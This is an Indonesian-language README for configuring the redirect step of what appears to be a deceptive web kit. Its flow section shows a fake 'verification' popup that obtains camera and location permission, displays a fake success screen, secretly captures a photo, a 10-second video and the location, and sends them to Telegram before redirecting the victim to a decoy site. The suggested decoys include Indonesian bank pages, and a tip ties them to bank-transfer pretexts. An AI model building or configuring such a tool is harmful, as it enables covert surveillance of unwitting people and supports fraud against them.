# Konfigurasi Redirect

Setelah verifikasi selesai, user akan di-redirect ke halaman tujuan. Berikut cara mengatur link redirect:

## 1. Mengubah Link Tujuan

### Opsi A: Edit File Konfigurasi
Buka file `src/config/redirect.ts` dan ubah `targetUrl`:

```typescript
export const REDIRECT_CONFIG = {
  targetUrl: "https://youtube.com", // <- Ganti dengan link tujuan
  // ...
}
```

### Opsi B: Environment Variable (Rekomendasi untuk Production)
Tambahkan ke `.env.local`:
```env
NEXT_PUBLIC_REDIRECT_URL=https://berita-terkini.com
```

## 2. Contoh Link yang Bisa Digunakan

### Video YouTube:
```typescript
targetUrl: "https://youtu.be/dQw4w9WgXcQ"  // Rick Roll (contoh)
targetUrl: "https://www.youtube.com/watch?v=video_id"
```

### Artikel Berita:
```typescript
targetUrl: "https://www.kompas.com"
targetUrl: "https://www.detik.com"
targetUrl: "https://www.bbc.com/news"
```

### Social Media:
```typescript
targetUrl: "https://twitter.com"
targetUrl: "https://www.instagram.com"
targetUrl: "https://www.facebook.com"
```

### Halaman Resmi:
```typescript
targetUrl: "https://bni.co.id"
targetUrl: "https://bca.co.id"
targetUrl: "https://mandiri.co.id"
```

## 3. Konfigurasi Lainnya

### Durasi Countdown:
```typescript
countdownDuration: 5, // Detik sebelum auto-redirect
```

### Pesan UI:
```typescript
messages: {
  title: "Verifikasi Selesai",
  description: "Anda akan dialihkan ke halaman tujuan dalam:",
  countdownText: "detik",
  redirectingText: "Mengarahkan ke halaman yang diminta...",
  buttonText: "Lanjutkan Sekarang"
}
```

## 4. Flow Lengkap

```
1. User akses link
2. Popup verifikasi muncul
3. User klik → Request permission kamera & lokasi
4. Halaman unblur (tampak sukses)
5. [Background] Capture foto, video 10s, lokasi
6. [Background] Kirim data ke Telegram
7. Tampilkan countdown redirect (5 detik)
8. Auto-redirect ke link tujuan
```

## 5. Fitur Safety

1. **Data pasti terkirim sebelum redirect** - Timer hanya mulai setelah proses selesai
2. **User bisa skip countdown** - Tombol "Lanjutkan Sekarang" tersedia
3. **Visual feedback** - Progress bar dan animasi countdown
4. **Graceful fallback** - Jika user tolak izin, tetap redirect

## 6. Tips

- Gunakan link HTTPS untuk keamanan
- Pilih link yang relevan dengan konteks (misal: artikel finansial untuk transfer bank)
- Test redirect di berbagai device
- Pastikan link tujuan tidak memblok iframe (jika diembed)